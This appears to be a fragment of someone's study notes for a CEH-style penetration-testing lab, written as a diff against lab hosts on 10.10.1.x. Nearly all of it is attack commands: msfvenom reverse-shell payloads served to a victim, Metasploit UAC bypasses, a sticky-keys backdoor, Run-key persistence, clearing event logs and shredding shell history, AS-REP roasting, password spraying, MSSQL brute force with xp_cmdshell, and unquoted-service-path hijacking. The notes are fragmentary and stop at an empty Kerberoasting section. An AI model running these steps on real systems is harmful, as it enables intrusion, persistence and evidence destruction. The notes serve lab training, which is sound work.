+	113. The Enter the assembly code here : prompt appears; type JMP ESP and press Enter.
+The result appears, displaying the hex code of JMP ESP (here, ffe4).
+---
+
+Perform Privilege Escalation to Gain Higher Privileges
+ 
+ 
+Escalate Privileges by Bypassing UAC and Exploiting Sticky Keys
+Sticky keys is a Windows accessibility feature that causes modifier keys to remain active, even after they are released. Sticky keys help users who have difficulty in pressing shortcut key combinations. They can be enabled by pressing Shift key for 5 times. Sticky keys also can be used to obtain unauthenticated, previleged access to the machine.
+
+ msfvenom -p windows/meterpreter/reverse_tcp lhost=10.10.1.13 lport=444 -f exe > /home/attacker/Desktop/Windows.exe.
+
+
+ created a directory or shared folder (share) at the location (/var/www/html) with the required access permission. So, we will use the same directory or shared folder (share) to share Windows.exe with the victim machine.
+To create a new directory to share the Windows.exe file with the target machine and provide the permissions, use the below commands
+
+
+	• Run mkdir /var/www/html/share command to create a shared folder
+	• Run chmod -R 755 /var/www/html/share command
+	• Run chown -R www-data:www-data /var/www/html/share command
+
+
+
+cp /home/attacker/Desktop/Windows.exe /var/www/html/share/
+
+
+Start the Apache server by executing service apache2 start command.
+
+
+	7. Run msfconsole command in the terminal window to launch Metasploit Framework.
+
+
+
+	8. In Metasploit type use exploit/multi/handler and press Enter.
+	9. Now, type set payload windows/meterpreter/reverse_tcp and press Enter.
+	10. Type set lhost 10.10.1.13 and press Enter to set lhost.
+	11. Type set lport 444 and press Enter to set lport.
+	12. Now, type run in the Metasploit console and press Enter.
+GO TO  http://10.10.1.13/share  DOWNLOAD AND Executable
+
+sysinfo
+getuid
+we shall try to bypass the user account control setting that is blocking you from gaining unrestricted access to the machine.
+ background 
+ search bypassuac and press Enter, to get the list of bypassuac modules
+ 
+  type use exploit/windows/local/bypassuac_fodhelper
+  Type set session 1 and press Enter.
+  Type show options in the meterpreter console and press Enter.
+  
+  	27. To set the LHOST option, type set LHOST 10.10.1.13 and press Enter.
+	28. To set the TARGET option, type set TARGET 0 and press Enter (here, 0 indicates nothing, but the Exploit Target ID).
+Type exploit and press Enter to begin the exploit on Windows 11 machine
+
+BypassUAC exploit has successfully bypassed the UAC setting on the Windows 11 machine.
+	31. Type getsystem -t 1 and press Enter to elevate privileges.
+	32. Now, type getuid and press Enter. The meterpreter session is now running with system privileges.
+
+
+	33. Type background and press Enter to background the current session.
+In this task, we will use sticky_keys module present in Metasploit to exploit the sticky keys feature in Windows 11.
+	34. Type use post/windows/manage/sticky_keys and press Enter.
+	35. Now type sessions -i* and press Enter to list the sessions in meterpreter.
+	36. In the console type set session 2 to set the privileged session as the current session.
+	37. In the console type exploit and press Enter, to begin the exploit.
+
+Maintain Remote Access and Hide Malicious Activities
+
+User System Monitoring and Surveillance using Spyrix
+ Use the user account Jason, with the password qwerty, to establish a Remote Desktop Connection with the target system. Enter the name of the target machine that will be visible in Spyrix Personal Monitor dashboard
+ 
+ 
+ Maintain Persistence by Modifying Registry Run Keys
+ 
+ Run the command msfvenom -p windows/meterpreter/reverse_tcp lhost=10.10.1.13 lport=444 -f exe > /home/attacker/Desktop/Test.exe to generate Test.exe payload.
+ 
+ 
+ ow, we will create payload that needs to be uploaded into the Run Registry of Windows 11 machine. Run the following command:
+msfvenom -p windows/meterpreter/reverse_tcp lhost=10.10.1.13 lport=4444 -f exe > /home/attacker/Desktop/registry.exe
+
+ we already created a directory or shared folder (share) at the location (/var/www/html) with the required access permission. So, we will use the same directory or shared folder (share) to share exploit.exe with the victim machine.
+To create a new directory to share the Test.exe and registry.exe files with the target machine and provide the permissions, use the below commands:
+	• Run mkdir /var/www/html/share command to create a shared folder
+	• Run chmod -R 755 /var/www/html/share command
+	• Run chown -R www-data:www-data /var/www/html/share command
+	6. Copy the payload into the shared folder by executing cp /home/attacker/Desktop/Test.exe /var/www/html/share/ and cp /home/attacker/Desktop/registry.exe /var/www/html/share/ commands.
+Start the Apache server by running service apache2 start command.
+
+
+
+	8. Run msfconsole command to launch Metasploit Framework.
+	9. In Metasploit, type use exploit/multi/handler and press Enter.
+	10. Now, type set payload windows/meterpreter/reverse_tcp and press Enter.
+	11. Type set lhost 10.10.1.13 and press Enter to set lhost.
+	12. Type set lport 444 and press Enter to set lport.
+	13. Now, type run in the Metasploit console and press Enter.
+
+
+	20. Type getuid and press Enter to display current user ID.
+	21. Now, we shall try to bypass the User Account Control setting that is blocking you from gaining unrestricted access to the machine.
+	22. Type background and press Enter, to background the current session.
+In this task, we will bypass Windows UAC protection via SilentCleanup task present in Windows Task Scheduler. It is present in Metasploit as a bypassuac_silentcleanup exploit.
+	23. In the terminal window, type use exploit/windows/local/bypassuac_silentcleanup and press Enter.
+Now, type set session 1 and press Enter.
+
+
+	25. Type show options in the meterpreter console and press Enter.
+
+
+	26. To set the LHOST option, type set LHOST 10.10.1.13 and press Enter.
+	27. To set the TARGET option, type set TARGET 0 and press Enter (here, 0 indicates nothing, but the Exploit Target ID).
+	28. Type exploit and press Enter to begin the exploit on Windows 11 machine.
+If you get Exploit completed, but no session was created message without any session, type exploit in the console again and press Enter.
+	29. The BypassUAC exploit has successfully bypassed the UAC setting on the Windows 11 machine.
+	30. Type getsystem -t 1 and press Enter to elevate privileges.
+	31. Now, type getuid and press Enter. The Meterpreter session is now running with system privileges.
+	32. Now, to add the malicious file into the Windows 11 machine's registry, open a shell by running the shell command.
+In the elevated shell, type reg add HKLM\Software\Microsoft\Windows\CurrentVersion\Run /v backdoor /t REG_EXPAND_SZ /d "C:\Users\Admin\Downloads\registry.exe" and press Enter.
+	34. Once the command is successfully executed, open another terminal window with root privileges and run msfconsole command.
+	35. In Metasploit, type use exploit/multi/handler and press Enter.
+	36. Now, type set payload windows/meterpreter/reverse_tcp and press Enter.
+	37. Type set lhost 10.10.1.13 and press Enter to set lhost.
+	38. Type set lport 4444 and press Enter to set lport.
+	39. Now, type exploit to start the exploitation.
+
+ restart the machine so that the malicious file that is placed in the Run Registry is executed.
+ 	42. Type getuid and press Enter, we can see that we have opened a reverse shell with admin privileges.
+
+Clear Logs to Hide the Evidence of Compromise
+run Clear_Event_Viewer_Logs.bat 
+
+	6. A Command Prompt window with Administrator privileges appears. Run wevtutil el command to display a list of event logs.
+el | enum-logs lists event log names.
+ run wevtutil cl [log_name] command (here, we are clearing system logs) to clear a specific event log.
+cl | clear-log: clears a log, log_name is the name of the log to clear, and ex: is the system, application, and security.
+	9. In Command Prompt, run cipher /w:[Drive or Folder or File Location] command to overwrite deleted files in a specific drive, folder, or file.
+Here, we are encrypting the deleted files on the C: drive. You can run this utility on the drive, folder, or file of your choice.
+
+Clear Linux Machine Logs using the BASH Shell
+
+ Parrot Security machine.
+	2. Open a Terminal window and run export HISTSIZE=0 command to disable the BASH shell from saving the history.
+HISTSIZE: determines the number of commands to be saved, which will be set to 0.
+In the Terminal window, run history -c command to clear the stored history.
+history -w command to delete the history of the current shell
+	5. Run shred ~/.bash_history command to shred the history file, making its content unreadable.
+This command is useful in cases where an investigator locates the file; because of this command, they would be unable to read any content in the history file.
+Now, run more ~/.bash_history command to view the shredded history content, as shown in the screenshot.
+
+shred ~/.bash_history && cat /dev/null > .bash_history && history -c && exit.
+
+Perform Active Directory (AD) Attacks Using Various Tools
+
+
+ Perform Initial Scans to Obtain Domain Controller IP and Domain Name
+  nmap 10.10.1.0/24 command to scan the entire subnet
+ 
+map shows that host 10.10.1.22 has port 88/TCP kerberos-sec and port 389/TCP LDAP opened
+nmap -A -sC -sV 10.10.1.22 c
+
+got domai name 
+
+
+Perform AS-REP Roasting Attack
+
+sudo 
+cd impacket/examples/
+python3 GetNPUsers.py CEH.com/ -no-pass -usersfile /root/ADtools/users.txt -dc-ip 10.10.1.22.
+	• GetNPUsers.py: Python script to retrieve AD user information.
+	• CEH.com/: Target AD domain.
+	• -no-pass: Flag to find user accounts not requiring pre-authentication.
+	• -usersfile ~/ADtools/users.txt: Path to the file with the user account list.
+	• -dc-ip 10.10.1.22: IP address of the DC to query.
+user Joshua has DONT_REQUIRE_PREAUTH set. As this user is vulnerable to AS-REP roasting, we obtain Joshua's password hash.
+	6. Copy that hash and save it as joshuahash.txt. Execute the command echo '[HASH]' > joshuahash.txt.
+Execute the command john --wordlist=/root/ADtools/rockyou.txt joshuahash.txt. This will crack the password hash and will give us the password in plain text
+
+
+
+Spray Cracked Password into Network using CrackMapExec.
+
+Spray Cracked Password into Network using CrackMapExec.
+
+cme rdp 10.10.1.0/24 -u /root/ADtools/users.txt -p "cupcake" to perform password spraying.
+	• rdp: Targets the Remote Desktop Protocol (RDP) service.
+	• 10.10.1.0/24: IP address range to target, encompassing all hosts within the subnet 10.10.1.0 with a subnet mask of 255.255.255.0.
+	• -u /root/ADtools/users.txt: Specifies the path to the file containing user accounts for authentication.
+	• -p "cupcake": Password which we cracked using AS-REP Roasting to test against the RDP service on the specified hosts.
+
+
+
+After the spray completion we find that user Mark is using the same password cupcake on host 10.10.1.40. We will now try to connect to RDP as user mark
+
+
+	6. Click on Menu and search for remmina in the search filed; then, select Remmina from the results.
+
+
+	7. In the Remmina Remote Desktop Client window, enter IP address 10.10.1.40 to connect (10.10.1.40 is the IP address of Windows 11 (AD) virtual machine ). A prompt appears asking Accept certificate? Tap yes.
+
+
+	8. In the Enter RDP authentication credentials window, enter Mark in the Username field and cupcake in the Password field; then, click OK.
+
+
+Perform Post-Enumeration using PowerView
+
+
+PowerView is a PowerShell tool designed for network and AD enumeration. It helps security professionals gather detailed information about user accounts, groups, computers, and domain trusts. PowerView is used to identify potential security weaknesses and misconfigurations in an AD environment. It is commonly employed in penetration testing and red team operations.
+
+
+
+cd /root/ADtools to move into the ADtools folder.
+
+	5. After starting the HTTP server, return to Remmina where our RDP session is active. Then, open the Firefox browser and navigate to the URL http://10.10.1.13:8000/PowerView.ps1 to automatically download the PowerView.ps1 script. Close the Firefox browser window.
+
+
+	6. Once the script is downloaded, launch PowerShell by searching for it in Windows search option.
+
+
+	7. Navigate to the Downloads folder by running the command cd Downloads. Before loading the script, run the command powershell -EP Bypass to enable script execution.
+	8. Now, execute the command . .\PowerView.ps1 to load the PowerView.ps1 script in PowerShell.
+	9. Next, execute Get-NetComputer command in PowerShell. This command will display all the information related to computers in AD. It lists all computer objects in AD, which can help in identifying network targets and mapping the AD environment.
+
+
+
+Get-NetGroup
+Get-NetUser
+
+
+Perform Attack on MSSQL service
+
+
+Save the username SQL_srv in a text file and name it as user.txt using command pluma user.txt.
+
+hydra -L user.txt -P /root/ADtools/rockyou.txt 10.10.1.30 mssql to brute force the MSSQL service password.
+
+	5. We have successfully cracked the password for SQL_srv, which is "batman". Next, we will attempt to log into the service using mssqlclient.py.
+	6. Execute command python3 /root/impacket/examples/mssqlclient.py CEH.com/SQL_srv:batman@10.10.1.30 -port 1433.
+Note the database name, which is "master" here.
+
+
+
+	7. Execute the SQL query SELECT name, CONVERT(INT, ISNULL(value, value_in_use)) AS IsConfigured FROM sys.configurations WHERE name='xp_cmdshell';, returning a value of 1, indicating that xp_cmdshell is enabled on the server.
+
+
+
+	8. Now, as we know that xp_cmdshell is enabled on SQL server we can use Metasploit to exploit this service. Type exit and press Enter; then execute the command msfconsole to launch Metasploit.
+
+
+
+	9. Execute the following commands:
+	• use exploit/windows/mssql/mssql_payload
+	• set RHOST 10.10.1.30
+	• set USERNAME SQL_srv
+	• set PASSWORD batman
+	• set DATABASE master
+
+
+nce all commands are configured, type exploit and press Enter.
+
+
+	11. Once the exploitation is complete, we will be getting a Meterpreter session as show in the screenshot.
+
+
+
+	12. Type command shell and press Enter. Execute whoami command, to determine the username of the currently logged on user. Here, it is $sqlexpress which is the SQL service.
+
+
+
+Perform Privilege Escalation
+
+WinPEASx64.exe is a tool for Windows privilege escalation, identifying misconfigurations and vulnerabilities for potential exploitation.
+
+
+ cd C:\.
+ Next, move to C:\Users\Public\Downloads using cd and execute the command powershell.
+ 
+ ow, we need to host winPEASx64.exe on the attacker machine using Python. Open a new terminal, type sudo su, press Enter, and use toor as password. Execute the command cd /root/ADtools.
+ 
+ Type python3 -m http.server and press Enter to host the winPEASx64.exe file.
+ 
+ 
+ 	7. Get back to the shell terminal and type wget http://10.10.1.13:8000/winPEASx64.exe -o winpeas.exe.
+Do not end the Python sever
+
+
+Once winpeas.exe is downloaded, execute it with ./winpeas.exe.
+
+
+	9. Script execution starts; wait until the execution completes.
+	10. Once the execution is completed, observe the output. Here, we have a file named file.exe in C:\Program Files\CEH Services that is unquoted and can be exploited for privilege escalation.
+
+	11. Open a new terminal with root privileges using the command sudo su and toor as password. Execute the msfvenom -p windows/shell_reverse_tcp lhost=10.10.1.13 lport=8888 -f exe > /root/ADtools/file.exe command.
+
+
+
+Get back to our shell terminal and move to C:\Program Files\CEH Services. Execute the command cd ../../.. ; cd "Program Files/CEH Services"
+
+
+	13. Execute the command move file.exe file.bak ; wget http://10.10.1.13:8000/file.exe -o file.exe.
+
+
+Now, go to another terminal and type nc -nvlp 8888 and press Enter.
+
+=
+
+Perform Kerberoasting Attack
+
+Rubeus is a tool for exploiting Kerberos weaknesses in Windows environments. Kerberoasting is a method to extract ticket granting ticket (TGT) hashes from AD. Attackers target service accounts with associated Kerberos service principal names (SPNs). TGTs are requested from the DC for these accounts, then cracked offline to reveal user passwords. Kerberoasting exploits weak service account passwords and the nature of Kerberos authentication.
+
+
+
+
+
+
+
+
+ 
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
